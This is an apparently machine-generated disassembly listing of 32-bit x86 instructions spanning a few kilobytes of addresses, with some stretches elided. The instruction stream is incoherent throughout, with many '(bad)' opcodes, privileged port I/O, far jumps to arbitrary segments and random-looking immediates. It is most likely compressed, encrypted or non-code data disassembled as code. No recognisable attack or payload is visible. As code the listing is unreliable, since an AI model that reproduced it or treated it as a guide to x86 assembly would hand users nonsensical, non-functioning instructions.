  423f8c:	jl     0x423f45
  423f8e:	lods   al,BYTE PTR ds:[esi]
  423f8f:	lock jecxz 0x423f73
  423f92:	and    ch,BYTE PTR [esi+0x62]
  423f95:	scas   eax,DWORD PTR es:[edi]
  423f96:	add    dh,cl
  423f98:	sbb    eax,0xe9288568
  423f9d:	jo     0x423f7c
  423f9f:	mov    al,ds:0x151226fe
  423fa4:	mov    esp,0x85925f1
  423fa9:	mov    ch,0xb7
  423fab:	push   0x833aef49
  423fb0:	les    edx,FWORD PTR [edi]
  423fb2:	or     ah,BYTE PTR [edi-0x469fee88]
  423fb8:	add    ebp,DWORD PTR [esi+0x2a8acf86]
  423fbe:	jl     0x423fcc
  423fc0:	mov    DWORD PTR [ecx],ebp
  423fc2:	call   DWORD PTR [eax]
  423fc4:	ins    BYTE PTR es:[edi],dx
  423fc5:	call   0xd545:0x31aa6e7b
  423fcc:	pusha  
  423fcd:	shl    BYTE PTR [ebx+0x73d2a80c],1
  423fd3:	sub    al,0xd3
  423fd5:	push   ds
  423fd6:	xchg   ebp,eax
  423fd7:	push   ebp
  423fd8:	es jb  0x423fdd
  423fdb:	dec    eax
  423fdc:	push   edi
  423fdd:	sub    BYTE PTR [ebx-0x71550b9d],dl
  423fe3:	sbb    ecx,DWORD PTR [ebx+0x6a3fe906]
  423fe9:	sub    DWORD PTR [edi+eax*8+0x45],esi
  423fed:	pop    esi
  423fee:	pop    eax
  423fef:	cld    
  423ff0:	xor    al,0xbf
  423ff2:	mov    BYTE PTR [ecx+0x33],dl
  423ff5:	or     al,0x80
  423ff7:	jns    0x424017
  423ff9:	mov    cl,0xeb
  423ffb:	mov    WORD PTR [edx+0x12],?
  423ffe:	(bad)  ds:[edi-0x23]
  424002:	(bad)  
  424003:	ja     0x424065
  424005:	pop    es
  424006:	mov    edx,0xa3d0dd73
  42400b:	jp     0x424010
  42400d:	xor    ch,dl
  42400f:	test   eax,0x78354a17
  424014:	jne    0x423f9e
  424016:	dec    ebp
  424017:	push   ebp
  424018:	push   edx
  424019:	shl    DWORD PTR [edi+0x14],0x1a
  42401d:	xlat   BYTE PTR ds:[ebx]
  42401e:	and    eax,0xb5711887
  424023:	xchg   ebx,edx
  424025:	scas   eax,DWORD PTR es:[edi]
  424026:	fmul   QWORD PTR [edx-0x69]
  424029:	xor    eax,0x912acb99
  42402e:	xchg   ecx,eax
  42402f:	sub    ebx,ebp
  424031:	mov    bh,0xf2
  424033:	adc    BYTE PTR [eax],0x0
	...
  424096:	jl     0x4240f0
  424098:	cs mov cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi+0x36aa1cf1]
  4240a3:	sub    eax,0xffffffea
  4240a6:	mov    eax,ds:0x700017f
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    BYTE PTR [ecx+0x7b01016a],ah
  4240b3:	adc    BYTE PTR gs:[edi],ah
  4240b6:	sub    eax,0x10b77dcf
  4240bb:	push   ebx
  4240bc:	inc    esp
  4240bd:	lds    edx,FWORD PTR [edi-0x1ccaf335]
  4240c3:	out    0xe2,al
  4240c5:	mov    bl,0x20
  4240c7:	add    eax,0xb03d62b9
  4240cc:	rol    BYTE PTR ds:0x58c1f290,1
  4240d2:	jne    0x4240e0
  4240d4:	or     dh,BYTE PTR [ebx]
  4240d6:	out    0xbe,al
  4240d8:	ret    0x8e43
  4240db:	pop    eax
  4240dc:	and    al,0xb9
  4240de:	inc    ebp
  4240df:	or     DWORD PTR [ebx-0x5f],ecx
  4240e2:	scas   eax,DWORD PTR es:[edi]
  4240e3:	jo     0x424073
  4240e5:	xor    BYTE PTR [ecx+0x29],bl
  4240e8:	mov    bl,0x68
  4240ea:	sbb    ah,bh
  4240ec:	xchg   ebx,eax
  4240ed:	imul   esi,DWORD PTR ds:0xdbbdcb74,0xffffffcb
  4240f4:	test   BYTE PTR [bp+di+0x25c5],bh
  4240f9:	fistp  DWORD PTR [ecx-0x50]
  4240fc:	leave  
  4240fd:	inc    ebx
  4240fe:	pop    edi
  4240ff:	imul   BYTE PTR [ecx+0x78]
  424102:	lds    ebp,FWORD PTR ds:0x4a2fdf46
  424108:	dec    esi
  424109:	nop
  42410a:	ins    DWORD PTR es:[edi],dx
  42410b:	mov    ch,0x4
  42410d:	mov    edi,0x47a7007c
  424112:	add    esi,ebp
  424114:	adc    DWORD PTR [ebx+ebp*1+0x707c3878],0x82920dce
  42411f:	iret   
  424120:	dec    esi
  424121:	sub    al,BYTE PTR [edi]
  424123:	inc    edi
  424124:	(bad)  
  424126:	xchg   ecx,eax
  424127:	pop    eax
  424128:	stos   BYTE PTR es:[edi],al
  424129:	or     cl,al
  42412b:	jae    0x4241a4
  42412d:	jle    0x4240cb
  42412f:	dec    esp
  424130:	lock ud2 
  424133:	lods   al,BYTE PTR ds:[esi]
  424134:	out    0x57,eax
  424136:	sub    al,0x32
  424138:	jne    0x424144
  42413a:	add    edx,DWORD PTR [ebx+0x29]
  42413d:	mov    WORD PTR [esi+esi*2+0x47],ds
  424141:	sub    DWORD PTR [edi+0x4a],edi
  424144:	icebp  
  424145:	leave  
  424146:	stos   BYTE PTR es:[edi],al
  424147:	xor    BYTE PTR [edi-0x20],cl
  42414a:	sub    al,0xb3
  42414c:	imul   edi,DWORD PTR [ebx-0x194401a9],0x5218be56
  424156:	inc    esi
  424157:	mov    bl,0x37
  424159:	mov    eax,ds:0xf3ac99af
  42415e:	retf   0xd185
  424161:	in     al,dx
  424162:	mov    dh,0x40
  424164:	jecxz  0x424105
  424166:	out    dx,al
  424167:	mov    ah,0x61
  424169:	es jne 0x424133
  42416c:	cdq    
  42416d:	fnstcw WORD PTR [eax]
  42416f:	jecxz  0x42413a
  424171:	ins    DWORD PTR es:[edi],dx
  424172:	jge    0x4241af
  424174:	dec    esi
  424175:	test   dh,bl
  424177:	shl    eax,1
  424179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42417a:	mov    edx,0x549c57c8
  42417f:	add    BYTE PTR [ebx-0x7b],bh
  424182:	ret    0xad71
  424185:	mov    esp,0x376f4cfc
  42418a:	lods   al,BYTE PTR ds:[esi]
  42418b:	in     al,dx
  42418c:	add    eax,0x956d06ea
  424191:	pushf  
  424192:	xor    BYTE PTR [bx],ah
  424195:	inc    eax
  424196:	pop    ebx
  424197:	cmp    ebp,DWORD PTR [eax-0x15]
  42419a:	adc    DWORD PTR [ebx-0x1979884],ebx
  4241a0:	(bad)  
  4241a1:	fldenv [eax]
  4241a3:	outs   dx,DWORD PTR ds:[esi]
  4241a4:	mov    ebx,0xca7c977d
  4241a9:	in     al,0x81
  4241ab:	and    eax,0xeaf6bebf
  4241b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241b1:	mov    ecx,0xd50e6c
	...
  424216:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42421d:	call   DWORD PTR [edi-0x322b4be9]
  424223:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  424225:	pushf  
  424226:	test   al,0x80
  424228:	add    DWORD PTR [eax],eax
  42422a:	pop    es
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    BYTE PTR [ecx+edi*4+0x3e32d21d],dl
  424234:	xchg   esi,eax
  424235:	pop    ss
  424236:	fisub  DWORD PTR [esp+esi*8+0x34555818]
  42423d:	inc    eax
  42423e:	push   ss
  42423f:	(bad)  
  424240:	lock (bad) 
  424242:	mov    ebx,0x742d87c7
  424247:	adc    eax,DWORD PTR [ebx]
  424249:	mov    dh,0x37
  42424b:	push   es
  42424c:	lds    ebp,FWORD PTR [eax]
  42424e:	cmc    
  42424f:	frstor [ebx+0x16]
  424252:	or     ecx,eax
  424254:	ja     0x424281
  424256:	enter  0xe041,0x9e
  42425a:	xor    esi,DWORD PTR [eax-0x538e0dd9]
  424260:	push   cs
  424261:	or     ah,BYTE PTR [eax]
  424263:	ds pop esp
  424265:	xchg   ebp,eax
  424266:	or     al,0x39
  424268:	inc    esp
  424269:	dec    ebx
  42426a:	sub    al,0xf0
  42426c:	ficom  DWORD PTR [eax+ebp*1]
  42426f:	int3   
  424270:	(bad)  [eax]
  424272:	outs   dx,BYTE PTR ds:[esi]
  424273:	ds popa 
  424275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424276:	retf   
  424277:	(bad)  
  424278:	pop    ecx
  424279:	loopne 0x4242a8
  42427b:	add    eax,0x8c78ee8d
  424280:	rcr    BYTE PTR [ebp-0x66fb05df],1
  424286:	mov    al,ds:0xaf88f0a4
  42428b:	adc    DWORD PTR [edi+0xf0af912],edi
  424291:	mov    ds:0xd2fdba61,al
  424296:	xor    al,0xf4
  424298:	(bad)  
  42429a:	and    edx,DWORD PTR [edx]
  42429c:	aad    0x19
  42429e:	sub    dl,dl
  4242a0:	call   0x5fba7ff0
  4242a5:	ret    
  4242a6:	lods   al,BYTE PTR ds:[esi]
  4242a7:	ror    DWORD PTR [ebp+0x2b],cl
  4242aa:	dec    ebx
  4242ab:	retf   
  4242ac:	xchg   esp,eax
  4242ad:	cmp    BYTE PTR [edi],bh
  4242af:	bound  edi,QWORD PTR [edx+0x186eff23]
  4242b5:	aad    0xe1
  4242b7:	dec    ebp
  4242b8:	xchg   edx,eax
  4242b9:	addr16 jmp 0xf5b2e63
  4242bf:	and    cl,BYTE PTR [ecx-0x1]
  4242c2:	inc    ebx
  4242c3:	xor    DWORD PTR [edx-0x60903e25],0xffffffd9
  4242ca:	mov    dh,0x35
  4242cc:	cmp    al,dh
  4242ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242cf:	mov    ds:0xeadb7105,eax
  4242d4:	push   cs
  4242d5:	es ret 0x756c
  4242d9:	cwde   
  4242da:	cld    
  4242db:	and    esp,DWORD PTR [ebx+0x58]
  4242de:	dec    ecx
  4242df:	push   cs
  4242e0:	xor    DWORD PTR [esi],esi
  4242e2:	mov    BYTE PTR [eax],al
  4242e4:	or     BYTE PTR [ebx],dh
  4242e6:	inc    esi
  4242e7:	sub    eax,DWORD PTR [edx+0xb]
  4242ea:	nop
  4242eb:	cli    
  4242ec:	out    0x5c,al
  4242ee:	jecxz  0x4242ac
  4242f0:	sahf   
  4242f1:	test   eax,0x65d54342
  4242f6:	es jl  0x42434f
  4242f9:	cmp    al,0x80
  4242fb:	jmp    0x42429e
  4242fd:	mov    esp,0xf03d3b39
  424302:	sub    DWORD PTR [eax+0x31],ecx
  424305:	scas   eax,DWORD PTR es:[edi]
  424306:	push   ss
  424307:	cmp    BYTE PTR [ecx],dl
  424309:	sub    BYTE PTR [esi+0x7f678ba3],ch
  42430f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424310:	imul   ebp,eax,0x85efeeed
  424316:	(bad)  
  424317:	mov    ebp,0xfbbdb51d
  42431c:	pusha  
  42431d:	retf   
  42431e:	mov    edx,0xad20d8b9
  424323:	jnp    0x42435c
  424325:	pop    ecx
  424326:	rcr    DWORD PTR [edx+0x58],1
  424329:	sbb    eax,0xdea9e779
  42432e:	lea    ebx,[ecx+0x59210a7b]
  424334:	add    BYTE PTR [eax],0x0
	...
  424393:	add    BYTE PTR [eax],al
  424395:	add    BYTE PTR [edx-0x24582da],cl
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	retf   0x3360
  4243a5:	in     eax,0xaf
  4243a7:	add    DWORD PTR [ecx],0x10700
  4243ad:	add    bh,ah
  4243af:	add    eax,0x5831c105
  4243b4:	outs   dx,BYTE PTR ds:[esi]
  4243b5:	js     0x4243a4
  4243b7:	mov    ebx,es
  4243b9:	mov    dh,0xa
  4243bb:	je     0x424364
  4243bd:	call   0xddf3:0xb6b858fd
  4243c4:	xchg   esi,eax
  4243c5:	sbb    al,0x92
  4243c7:	dec    eax
  4243c8:	pop    edx
  4243c9:	adc    eax,0x9b95b447
  4243ce:	mov    bh,BYTE PTR [edx+edi*2+0x68]
  4243d2:	loope  0x4243a0
  4243d4:	push   es
  4243d5:	rol    esi,0x8b
  4243d8:	add    BYTE PTR [esi],dh
  4243da:	cli    
  4243db:	xlat   BYTE PTR ds:[ebx]
  4243dc:	jnp    0x42435e
  4243de:	or     dl,0x51
  4243e1:	dec    BYTE PTR [esi-0x5b]
  4243e4:	dec    ecx
  4243e5:	std    
  4243e6:	lds    ebp,FWORD PTR [ebp+0x7c95d5fb]
  4243ec:	push   edx
  4243ed:	and    eax,0x74156cc4
  4243f2:	arpl   WORD PTR [edi],bx
  4243f4:	or     eax,0x7d58dcec
  4243f9:	lods   eax,DWORD PTR ds:[esi]
  4243fa:	popa   
  4243fb:	(bad)
  4243ff:	adc    cl,ah
  424401:	pop    ds
  424402:	sub    al,0xfc
  424404:	adc    al,BYTE PTR [esi]
  424406:	xor    ch,dl
  424408:	test   cl,dl
  42440a:	mov    WORD PTR [ebp+esi*2-0x13],ss
  42440e:	sub    eax,0x4519e1b0
  424413:	cdq    
  424414:	ss ds test eax,0xf368bbaf
  42441b:	loope  0x42441d
  42441d:	adc    al,0xa1
  42441f:	loop   0x424480
  424421:	xor    ah,BYTE PTR [edx+0x3ab7cbb7]
  424427:	std    
  424428:	(bad)  
  424429:	pop    ss
  42442a:	das    
  42442b:	xor    DWORD PTR [esi+0x9],esi
  42442e:	mov    dh,BYTE PTR [ebx-0x1b]
  424431:	cld    
  424432:	inc    edx
  424433:	dec    esi
  424434:	cwde   
  424435:	or     ah,dh
  424437:	mov    ecx,0xa94d6566
  42443c:	jae    0x4244a2
  42443e:	push   ss
  42443f:	push   es
  424440:	das    
  424441:	imul   ebp,DWORD PTR [ebx+0x5c65cd85],0x35
  424448:	int    0xb6
  42444a:	repz and eax,0xbf169c60
  424450:	idiv   bl
  424452:	cmp    eax,0xfa79a987
  424457:	jecxz  0x42443d
  424459:	(bad)  
  42445a:	cmc    
  42445b:	push   esp
  42445c:	jno    0x42444a
  42445e:	mov    ch,0xa3
  424460:	std    
  424461:	ins    DWORD PTR es:[edi],dx
  424462:	hlt    
  424463:	je     0x4244da
  424465:	lahf   
  424466:	xor    eax,esp
  424468:	dec    ecx
  424469:	or     eax,0xabbe7403
  42446e:	jg     0x42445b
  424470:	cmp    ecx,DWORD PTR [edx-0x52]
  424473:	add    ebx,DWORD PTR [ebx+0x1]
  424476:	xchg   ecx,eax
  424477:	xchg   ebx,eax
  424478:	or     BYTE PTR [esi-0x7f],ch
  42447b:	lds    esp,FWORD PTR [ebp+0x46]
  42447e:	push   cs
  42447f:	mov    ebx,0x4813a270
  424484:	cs xor esp,esp
  424487:	xor    BYTE PTR [edx+eax*1-0x6e],dh
  42448b:	pop    ebp
  42448c:	push   esp
  42448d:	stc    
  42448e:	add    BYTE PTR [esi],0xbd
  424491:	sub    bl,BYTE PTR [ebp+0x4fee6af3]
  424497:	or     ch,BYTE PTR [ebx*4-0x284ad49f]
  42449e:	sahf   
  42449f:	stos   BYTE PTR es:[edi],al
  4244a0:	repz iret 
  4244a2:	push   edx
  4244a3:	add    al,0x9a
  4244a5:	xor    ecx,esp
  4244a7:	addr16 pop edi
  4244a9:	jmp    0xb9f9bc8b
  4244ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244af:	adc    DWORD PTR [esp+ecx*2-0x2d],ecx
  4244b3:	loopne 0x42452c
	...
  424515:	add    al,ah
  424517:	outs   dx,DWORD PTR ds:[esi]
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0xd20ff3ab
  424523:	jp     0x42453e
  424525:	jmp    0x107:0x182b6
  42452c:	add    BYTE PTR [eax],al
  42452e:	repz jne 0x424586
  424531:	imul   ebx,esi,0xffffffea
  424534:	push   0x6c
  424536:	enter  0x2dbb,0xaa
  42453a:	ret    
  42453b:	xchg   esp,eax
  42453c:	and    dl,BYTE PTR [edi]
  42453e:	call   0x4536683d
  424543:	xor    ah,BYTE PTR [edx+0xf7ffd98]
  424549:	mov    ch,0xe7
  42454b:	ss add eax,0x4a79d332
  424551:	call   0x271cffd8
  424556:	xchg   esi,eax
  424557:	xchg   edx,eax
  424558:	cmp    eax,DWORD PTR ds:0x99565a4
  42455e:	(bad)  
  42455f:	adc    ch,BYTE PTR [ebp-0x15acfb19]
  424565:	sbb    ah,BYTE PTR [esi+edx*8+0x61]
  424569:	test   DWORD PTR [eax+ebx*8+0x30589864],0xe8b4b5ee
  424574:	(bad)  
  424575:	jae    0x4245da
  424577:	mov    ebx,0xb3d3b63f
  42457c:	inc    eax
  42457d:	xor    al,0x92
  42457f:	mov    BYTE PTR [ecx+0x5be27dd1],al
  424585:	push   cs
  424586:	sbb    BYTE PTR [ecx-0x294ed6ce],ch
  42458c:	mov    esp,0xa5f6a3f4
  424591:	add    DWORD PTR [edx+0x42],esi
  424594:	das    
  424595:	(bad)  
  424596:	pop    esi
  424597:	push   es
  424598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424599:	add    al,0x4c
  42459b:	pop    esi
  42459c:	xchg   esi,eax
  42459d:	outs   dx,DWORD PTR ds:[esi]
  42459e:	cld    
  42459f:	jg     0x4245ba
  4245a1:	test   BYTE PTR [edx+0x20641e6b],ah
  4245a7:	ja     0x424591
  4245a9:	loope  0x424549
  4245ab:	data16 into 
  4245ad:	pop    DWORD PTR [eax-0x4a7ed2f5]
  4245b3:	mov    bl,0x91
  4245b5:	je     0x42461a
  4245b7:	sbb    esp,DWORD PTR [ebx-0x7a711bf]
  4245bd:	xchg   BYTE PTR [eax-0x4aecacb6],ah
  4245c3:	mov    ch,0x7b
  4245c5:	stc    
  4245c6:	retf   0x765b
  4245c9:	pop    ecx
  4245ca:	pop    es
  4245cb:	pop    edi
  4245cc:	adc    DWORD PTR [ebx+0x56],ebp
  4245cf:	mov    ch,0xef
  4245d1:	in     al,dx
  4245d2:	dec    esp
  4245d3:	mov    ecx,0x8de7a95f
  4245d8:	sbb    al,0xee
  4245da:	pop    ss
  4245db:	push   cs
  4245dc:	nop
  4245dd:	push   es
  4245de:	sub    ebx,esi
  4245e0:	clc    
  4245e1:	sub    ah,BYTE PTR [ebx+0x6f7e95ef]
  4245e7:	ja     0x42457a
  4245e9:	xchg   bh,dh
  4245eb:	popf   
  4245ec:	xchg   ecx,eax
  4245ed:	or     al,0xfa
  4245ef:	add    esi,DWORD PTR [edx+0x19]
  4245f2:	adc    BYTE PTR [edi+0x35],cl
  4245f5:	(bad)  
  4245f6:	push   ds
  4245f7:	sbb    eax,0x4638069e
  4245fc:	neg    ebx
  4245fe:	inc    esp
  4245ff:	inc    esi
  424600:	or     DWORD PTR [eax-0x712a7f38],esi
  424606:	je     0x424605
  424608:	or     al,0x42
  42460a:	cmp    dl,BYTE PTR [eax-0x331002a0]
  424610:	and    DWORD PTR [edx],0x2
  424613:	retf   0x1071
  424616:	push   0x8e079a10
  42461b:	push   edx
  42461c:	dec    edi
  42461d:	xchg   DWORD PTR [eax+0x64530c71],edx
  424623:	rcr    al,cl
  424625:	jns    0x424690
  424627:	pop    es
  424628:	add    al,0xa9
  42462a:	and    edi,edx
  42462c:	out    dx,eax
  42462d:	mov    dh,0x6a
  42462f:	cmp    ebp,DWORD PTR [eax-0x53127d51]
	...
  424695:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    ecx,DWORD PTR [ecx]
  4246a3:	das    
  4246a4:	loopne 0x424642
  4246a6:	mov    ebp,0x7000183
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    BYTE PTR [ecx+0x24],ah
  4246b0:	push   ebp
  4246b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246b3:	sar    BYTE PTR [esi+0xe92ba1d],0xf4
  4246ba:	dec    esi
  4246bb:	fs jno 0x4246ae
  4246be:	adc    al,0xa0
  4246c0:	mov    dh,0xcb
  4246c2:	inc    edi
  4246c3:	aad    0x1e
  4246c5:	ret    0x6881
  4246c8:	outs   dx,BYTE PTR ds:[esi]
  4246c9:	push   ebp
  4246ca:	aam    0xc
  4246cc:	dec    ecx
  4246cd:	shl    ch,cl
  4246cf:	out    dx,eax
  4246d0:	inc    ebp
  4246d1:	popa   
  4246d2:	das    
  4246d3:	scas   ax,WORD PTR es:[edi]
  4246d5:	mov    ch,0xa
  4246d7:	mov    ebx,0x9bc918b5
  4246dc:	out    dx,al
  4246dd:	adc    cl,BYTE PTR [eax+0x70]
  4246e0:	mul    edx
  4246e2:	add    eax,0x869ec1e7
  4246e7:	jo     0x42474a
  4246e9:	outs   dx,DWORD PTR ds:[esi]
  4246ea:	xchg   edx,eax
  4246eb:	mov    es,esp
  4246ed:	fistp  DWORD PTR [esp+ebp*1]
  4246f0:	jmp    0x4246f0
  4246f2:	inc    ebx
  4246f3:	sub    BYTE PTR [ebx-0x4bf4c12a],0xb7
  4246fa:	xchg   BYTE PTR [edx+0x12],dh
  4246fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246fe:	mov    bh,0x17
  424700:	pop    ebp
  424701:	fldcw  WORD PTR [edi-0x109fd247]
  424707:	cli    
  424708:	jge    0x424705
  42470a:	fsubr  st(5),st
  42470c:	pop    ss
  42470d:	aaa    
  42470e:	dec    edx
  42470f:	jmp    0x82cad2a9
  424714:	fs xchg edi,eax
  424716:	sbb    cl,dh
  424718:	outs   dx,BYTE PTR ds:[esi]
  424719:	shl    BYTE PTR [ebx],cl
  42471b:	fld    TBYTE PTR [edx]
  42471d:	pushf  
  42471e:	cs loope 0x4246cd
  424721:	mul    DWORD PTR [ebx]
  424723:	push   esi
  424724:	fwait
  424725:	or     DWORD PTR ds:0xa38c5782,0xffffffe6
  42472c:	or     DWORD PTR [edx-0x7f],edx
  42472f:	in     eax,dx
  424730:	adc    ch,dh
  424732:	jecxz  0x4246d3
  424734:	stos   DWORD PTR es:[edi],eax
  424735:	jmp    0xa545:0xae13d87d
  42473c:	pusha  
  42473d:	sti    
  42473e:	jae    0x424765
  424740:	pop    ecx
  424741:	or     DWORD PTR [edi-0x28f9fd6f],esp
  424747:	test   DWORD PTR [ebx+0x65],edi
  42474a:	jo     0x424700
  42474c:	push   ebp
  42474d:	pop    ds
  42474e:	scas   eax,DWORD PTR es:[edi]
  42474f:	mov    edi,0x25f20b05
  424754:	test   al,0x1b
  424756:	(bad)  
  424757:	cmc    
  424758:	(bad)  
  424759:	dec    ebp
  42475a:	mov    eax,0x795928e
  42475f:	out    dx,eax
  424760:	scas   al,BYTE PTR es:[edi]
  424761:	les    ebp,FWORD PTR [ebp+0x9]
  424764:	into   
  424765:	pop    ecx
  424766:	push   esi
  424767:	fisttp WORD PTR [ecx-0x36ab2fa4]
  42476d:	xlat   BYTE PTR ds:[ebx]
  42476e:	cmp    DWORD PTR [edi+0x26e57183],edi
  424774:	inc    DWORD PTR [esi+0x4e634d11]
  42477a:	cdq    
  42477b:	inc    ecx
  42477c:	arpl   WORD PTR [ebp+0x6f],bp
  42477f:	push   cs
  424780:	mov    ds:0xac7bc6,al
  424785:	aas    
  424786:	cmc    
  424787:	imul   edi,DWORD PTR [esp+eax*1],0xffffffdd
  42478b:	adc    BYTE PTR [esi-0x41],0x91
  42478f:	shl    edi,1
  424791:	adc    cl,BYTE PTR [ebp+0x6b]
  424794:	sub    al,0x23
  424796:	out    dx,al
  424797:	mov    ch,0x78
  424799:	lahf   
  42479a:	dec    BYTE PTR [edx+0x77]
  42479d:	jp     0x424756
  42479f:	cmc    
  4247a0:	inc    edx
  4247a1:	mov    edi,0x32d55274
  4247a6:	xlat   BYTE PTR ds:[ebx]
  4247a7:	and    eax,DWORD PTR [ebp+eiz*1-0x6097615b]
  4247ae:	sub    DWORD PTR [edi],ebp
  4247b0:	mov    esp,0xcc092819
	...
  424815:	add    BYTE PTR [edx],ah
  424817:	pop    eax
  424818:	test   bh,ch
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax+0x285df822],0x10
  424825:	adc    al,0xc4
  424827:	test   BYTE PTR [ecx],al
  424829:	add    BYTE PTR [edi],al
  42482b:	add    DWORD PTR [eax],eax
  42482d:	add    dh,dl
  42482f:	and    eax,0x5c1ae71c
  424834:	add    ch,bh
  424836:	test   eax,0xd53fbc2b
  42483b:	ds jge 0x4247cd
  42483e:	enter  0xdfb2,0x9c
  424842:	adc    al,0xd6
  424844:	or     al,0x37
  424846:	mov    ds:0x6ee2dca9,al
  42484b:	and    ah,BYTE PTR [ecx+0x6c]
  42484e:	push   esp
  42484f:	in     eax,0x9d
  424851:	pop    eax
  424852:	and    DWORD PTR [esi+0x55],eax
  424855:	ss aad 0x6b
  424858:	fistp  QWORD PTR [ecx]
  42485a:	fsub   DWORD PTR [ebp-0x74]
  42485d:	jl     0x4247e5
  42485f:	(bad)  
  424861:	ja     0x424848
  424863:	test   BYTE PTR [eax-0x1d],dl
  424866:	cmp    ah,dh
  424868:	mov    cl,0x1e
  42486a:	cmc    
  42486b:	xchg   edx,eax
  42486c:	(bad)  
  42486d:	retf   
  42486e:	hlt    
  42486f:	push   esi
  424870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424871:	sub    BYTE PTR [edi+ebx*2+0x318964b2],dl
  424878:	inc    ebx
  424879:	rol    ebx,1
  42487b:	xchg   ebp,eax
  42487c:	xchg   DWORD PTR [esi],esp
  42487e:	or     al,0xb9
  424880:	adc    BYTE PTR [ebp+0x50],al
  424883:	sti    
  424884:	fstp   st(4)
  424886:	mov    ecx,0xe043ae14
  42488b:	cmp    BYTE PTR [eax-0x12],0xf0
  42488f:	mov    bl,0xe2
  424891:	ins    BYTE PTR es:[edi],dx
  424892:	and    al,0x9
  424894:	adc    eax,0xb92d07ce
  424899:	mov    WORD PTR ds:0xf8203721,gs
  42489f:	sub    BYTE PTR [ebp+0x50d358c1],0x95
  4248a6:	bound  edi,QWORD PTR [eax+0x8535b04]
  4248ac:	rcr    BYTE PTR [ebx],0xbb
  4248af:	mov    ds:0x85f328fa,eax
  4248b4:	retf   
  4248b5:	push   0x2252af88
  4248ba:	ror    DWORD PTR [esi-0x54],0x3f
  4248be:	jl     0x42492b
  4248c0:	in     al,0xb9
  4248c2:	frstor [eax+0x793f4f2c]
  4248c8:	imul   edi,DWORD PTR [eax+0x2c],0xffffffc5
  4248cc:	fisttp WORD PTR [eax]
  4248ce:	aaa    
  4248cf:	pop    ss
  4248d0:	push   edi
  4248d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248d2:	and    ecx,0x983f290f
  4248d8:	xchg   esp,eax
  4248d9:	add    DWORD PTR [edi+edx*8],edi
  4248dc:	into   
  4248dd:	add    BYTE PTR [ebp+0x74138475],bl
  4248e3:	xlat   BYTE PTR ds:[ebx]
  4248e4:	imul   ecx,DWORD PTR ds:0x6b80fb98,0x5d577e76
  4248ee:	push   esi
  4248ef:	sub    BYTE PTR [edx+edi*1],ch
  4248f2:	xchg   ebx,eax
  4248f3:	pushf  
  4248f4:	xor    edi,DWORD PTR [esi-0x27b87b57]
  4248fa:	add    DWORD PTR [ebx],0x65
  4248fd:	push   ecx
  4248fe:	enter  0x65eb,0x4
  424902:	in     eax,0x57
  424904:	sbb    eax,0x3575756
  424909:	dec    ebx
  42490a:	stc    
  42490b:	icebp  
  42490c:	in     eax,0x81
  42490e:	imul   eax,DWORD PTR [eax+0x60],0xaa2ef002
  424915:	push   0xb500ad27
  42491a:	(bad)  
  42491b:	xor    DWORD PTR [esi],esi
  42491d:	adc    ebp,DWORD PTR [edx+0x6e]
  424920:	pop    esp
  424921:	push   cs
  424922:	retf   
  424923:	inc    ebp
  424924:	ins    DWORD PTR es:[edi],dx
  424925:	sub    DWORD PTR [edi],ebx
  424927:	adc    esi,DWORD PTR [ecx+ebx*4+0x5c]
  42492b:	or     BYTE PTR [ecx],dh
  42492d:	add    esp,esi
  42492f:	sub    ch,BYTE PTR [eax]
  424931:	cwde   
  424932:	mov    eax,ds:0xea11
	...
  424993:	add    BYTE PTR [eax],al
  424995:	add    BYTE PTR [ebx+0x18],ch
  424998:	arpl   WORD PTR [edx+0x73],bp
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0x4d12bac2
  4249a4:	aam    0xcf
  4249a6:	retf   
  4249a7:	test   DWORD PTR [ecx],eax
  4249a9:	add    BYTE PTR [edi],al
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    BYTE PTR [ebx-0x136d0c2b],bh
  4249b3:	mov    eax,ds:0x58a52cdb
  4249b8:	or     ecx,DWORD PTR [edi+0x5f]
  4249bb:	xchg   ebp,eax
  4249bc:	jp     0x424a24
  4249be:	(bad)  
  4249bf:	sub    eax,0x72c1492e
  4249c4:	dec    BYTE PTR [edx-0x342cd62f]
  4249ca:	and    al,0x55
  4249cc:	pop    eax
  4249cd:	jne    0x4249be
  4249cf:	out    dx,eax
  4249d0:	cmp    BYTE PTR [eax],ch
  4249d2:	dec    esp
  4249d3:	fwait
  4249d4:	(bad)  
  4249d5:	adc    cl,dl
  4249d7:	lock jae 0x424a27
  4249da:	jp     0x424a35
  4249dc:	push   edi
  4249dd:	jbe    0x4249d3
  4249df:	lea    ebx,[esi]
  4249e1:	pop    es
  4249e2:	pop    ss
  4249e3:	xor    BYTE PTR [edi-0x6e],al
  4249e6:	cmp    cl,BYTE PTR [edx]
  4249e8:	jbe    0x424a55
  4249ea:	jmp    0x424996
  4249ec:	xor    DWORD PTR [esi],0x51831e99
  4249f2:	iret   
